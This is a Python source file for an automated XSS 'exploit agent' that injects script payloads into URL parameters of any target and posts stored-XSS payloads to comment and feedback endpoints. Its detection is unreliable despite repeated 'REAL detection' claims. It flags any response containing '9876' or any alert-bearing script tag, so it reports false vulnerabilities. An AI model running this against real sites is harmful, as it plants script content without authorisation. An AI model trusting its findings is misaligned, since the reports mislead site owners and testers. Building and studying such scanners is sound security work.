"""
Cross-Site Scripting (XSS) Exploit Agent - FIXED for Real World Testing
NO HARDCODED ENDPOINTS - Works on any target with REAL reflection detection
"""

import asyncio
import aiohttp
import re
import urllib.parse
from typing import Dict, List, Any, Optional
from loguru import logger

from agents.base import BaseAgent, AgentResult


class XSSAgent(BaseAgent):
    """
    Professional XSS Testing Agent
    Uses REAL reflection detection - no hardcoded endpoints
    """
    
    def __init__(self):
        super().__init__(
            name="xss_agent",
            agent_type="exploit"
        )
        self.description = "Professional XSS testing - real bug bounty approach"
        
        # Professional XSS Payloads
        self.basic_payloads = [
            "<script>alert(9876)</script>",  # Unique number for detection
            "<img src=x onerror=alert(9876)>",
            "<svg onload=alert(9876)>",
            "'><script>alert(9876)</script>",
            "\"><script>alert(9876)</script>",
            "<iframe src=javascript:alert(9876)>",
        ]
        
        # Unique marker for reflection detection
        self.unique_marker = "XSS_TEST_9876"
    
    async def execute(self, target: str, config: Optional[Dict[str, Any]] = None) -> AgentResult:
        """Execute XSS testing"""
        try:
            config = config or {}
            logger.info(f"ðŸ” Starting XSS assessment for {target}")
            
            results = {
                "agent": "xss_agent",
                "target": target,
                "vulnerabilities": [],
                "urls_tested": 0,
                "payloads_tested": 0
            }
            
            # Get discovered URLs from recon
            discovered_urls = config.get("discovered_urls", [])
            
            if not discovered_urls:
                logger.warning("âš ï¸ No URLs from reconnaissance - cannot test for XSS")
                return AgentResult(
                    success=True,
                    data=results,
                    message="No URLs discovered by reconnaissance. Run recon first."
                )
            
            logger.info(f"ðŸŽ¯ Testing {len(discovered_urls)} discovered URLs for XSS")
            
            # Test each discovered URL
            async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=60)) as session:
                for url_data in discovered_urls[:15]:  # Limit for performance
                    url = url_data.get("url", "") if isinstance(url_data, dict) else str(url_data)
                    
                    if not url or not url.startswith(('http://', 'https://')):
                        continue
                    
                    results["urls_tested"] += 1
                    
                    # Test GET parameters for reflected XSS
                    vuln = await self._test_url_for_xss(session, url, results)
                    if vuln:
                        results["vulnerabilities"].append(vuln)
                        logger.info(f"ðŸš¨ XSS found in {url}")
                    
                    # Test POST for stored XSS
                    if any(keyword in url.lower() for keyword in ['comment', 'post', 'feedback', 'review', 'message']):
                        stored_vuln = await self._test_stored_xss(session, url, results)
                        if stored_vuln:
                            results["vulnerabilities"].append(stored_vuln)
                            logger.info(f"ðŸš¨ Stored XSS found in {url}")
            
            logger.info(f"âœ… XSS scan complete: {len(results['vulnerabilities'])} vulnerabilities found")
            
            return AgentResult(
                success=True,
                data=results,
                message=f"Found {len(results['vulnerabilities'])} XSS vulnerabilities"
            )
            
        except Exception as e:
            logger.error(f"XSS agent error: {e}")
            return AgentResult(
                success=False,
                error=str(e),
                data={"target": target}
            )
    
    async def _test_url_for_xss(self, session: aiohttp.ClientSession, url: str, results: Dict) -> Optional[Dict]:
        """Test a single URL for reflected XSS using REAL reflection detection"""
        try:
            parsed = urllib.parse.urlparse(url)
            
            # Test GET parameters
            if parsed.query:
                params = urllib.parse.parse_qs(parsed.query)
                for param_name in params:
                    vuln = await self._test_parameter_xss(session, url, param_name, "GET", results)
                    if vuln:
                        return vuln
            
            # Also test URL path injection (less common but exists)
            if not parsed.query:
                vuln = await self._test_parameter_xss(session, url, "test_param", "GET", results)
                if vuln:
                    return vuln
            
            return None
            
        except Exception as e:
            logger.debug(f"Error testing {url}: {e}")
            return None
    
    async def _test_parameter_xss(self, session: aiohttp.ClientSession, url: str, param: str, method: str, results: Dict) -> Optional[Dict]:
        """Test a specific parameter for XSS using REAL reflection detection"""
        try:
            parsed = urllib.parse.urlparse(url)
            base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
            
            # Test each payload
            for payload in self.basic_payloads[:4]:  # Test fewer for speed
                results["payloads_tested"] += 1
                
                # Build test URL with payload
                params = urllib.parse.parse_qs(parsed.query) if parsed.query else {}
                params[param] = [payload]
                new_query = urllib.parse.urlencode(params, doseq=True)
                test_url = f"{base_url}?{new_query}"
                
                try:
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        response_text = await response.text()
                        
                        # REAL DETECTION METHOD 1: Direct Payload Reflection (unencoded)
                        if payload in response_text:
                            logger.info(f"ðŸŽ¯ XSS payload reflected unencoded!")
                            return {
                                "vulnerability_type": "xss",
                                "type": "Reflected XSS",
                                "severity": "HIGH",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "method": method,
                                "xss_type": "reflected",
                                "evidence": f"Payload reflected in response: {payload[:50]}",
                                "title": f"Reflected XSS in {param} parameter",
                                "description": f"XSS vulnerability detected - payload reflected without encoding",
                                "cwe": "CWE-79"
                            }
                        
                        # REAL DETECTION METHOD 2: Check for our unique marker (9876)
                        if "9876" in response_text or self.unique_marker in response_text:
                            logger.info(f"ðŸŽ¯ XSS marker detected in response!")
                            return {
                                "vulnerability_type": "xss",
                                "type": "Reflected XSS",
                                "severity": "HIGH",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "method": method,
                                "xss_type": "reflected",
                                "evidence": "Unique XSS marker found in response",
                                "title": f"Reflected XSS in {param} parameter",
                                "description": f"XSS vulnerability detected - unique marker reflected",
                                "cwe": "CWE-79"
                            }
                        
                        # REAL DETECTION METHOD 3: Check for script tags in response
                        if re.search(r'<script[^>]*>.*alert.*</script>', response_text, re.IGNORECASE | re.DOTALL):
                            logger.info(f"ðŸŽ¯ Script tag with alert found in response!")
                            return {
                                "vulnerability_type": "xss",
                                "type": "Reflected XSS",
                                "severity": "HIGH",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "method": method,
                                "xss_type": "reflected",
                                "evidence": "Script tag found in HTML response",
                                "title": f"Reflected XSS in {param} parameter",
                                "description": f"XSS vulnerability detected - script injection successful",
                                "cwe": "CWE-79"
                            }
                        
                        # REAL DETECTION METHOD 4: Check for event handlers (onerror, onload)
                        if re.search(r'(onerror|onload)\s*=\s*["\']?alert', response_text, re.IGNORECASE):
                            logger.info(f"ðŸŽ¯ Event handler XSS detected!")
                            return {
                                "vulnerability_type": "xss",
                                "type": "Reflected XSS",
                                "severity": "HIGH",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "method": method,
                                "xss_type": "reflected",
                                "evidence": "Event handler injection detected",
                                "title": f"Reflected XSS in {param} parameter",
                                "description": f"XSS vulnerability detected via event handler",
                                "cwe": "CWE-79"
                            }
                
                except asyncio.TimeoutError:
                    pass
                except Exception as e:
                    logger.debug(f"Error testing payload {payload}: {e}")
            
            return None
            
        except Exception as e:
            logger.debug(f"Error in parameter test: {e}")
            return None
    
    async def _test_stored_xss(self, session: aiohttp.ClientSession, url: str, results: Dict) -> Optional[Dict]:
        """Test POST endpoints for stored XSS"""
        try:
            # Try common POST parameters with XSS payloads
            test_payloads = [
                {"comment": "<script>alert(9876)</script>"},
                {"message": "<script>alert(9876)</script>"},
                {"feedback": "<img src=x onerror=alert(9876)>"},
                {"note": "<svg onload=alert(9876)>"},
            ]
            
            for payload_data in test_payloads[:2]:  # Limit for performance
                results["payloads_tested"] += 1
                
                try:
                    async with session.post(url, json=payload_data, timeout=aiohttp.ClientTimeout(total=5)) as response:
                        response_text = await response.text()
                        
                        # Check if payload is stored and reflected back
                        payload_value = list(payload_data.values())[0]
                        
                        # REAL DETECTION: Check if payload is in response
                        if payload_value in response_text or "9876" in response_text:
                            logger.info(f"ðŸŽ¯ Stored XSS detected!")
                            return {
                                "vulnerability_type": "xss",
                                "type": "Stored XSS",
                                "severity": "HIGH",
                                "url": url,
                                "method": "POST",
                                "payload": str(payload_data),
                                "xss_type": "stored",
                                "evidence": "Payload stored and reflected in response",
                                "title": f"Stored XSS in {url}",
                                "description": f"Stored XSS vulnerability - payload persisted",
                                "cwe": "CWE-79"
                            }
                        
                        # Check for script tags
                        if re.search(r'<script[^>]*>.*alert.*</script>', response_text, re.IGNORECASE):
                            logger.info(f"ðŸŽ¯ Stored XSS with script tag detected!")
                            return {
                                "vulnerability_type": "xss",
                                "type": "Stored XSS",
                                "severity": "HIGH",
                                "url": url,
                                "method": "POST",
                                "payload": str(payload_data),
                                "xss_type": "stored",
                                "evidence": "Script tag stored in application",
                                "title": f"Stored XSS in {url}",
                                "description": f"Stored XSS vulnerability detected",
                                "cwe": "CWE-79"
                            }
                
                except:
                    continue
            
            return None
            
        except Exception as e:
            logger.debug(f"Error in stored XSS test: {e}")
            return None




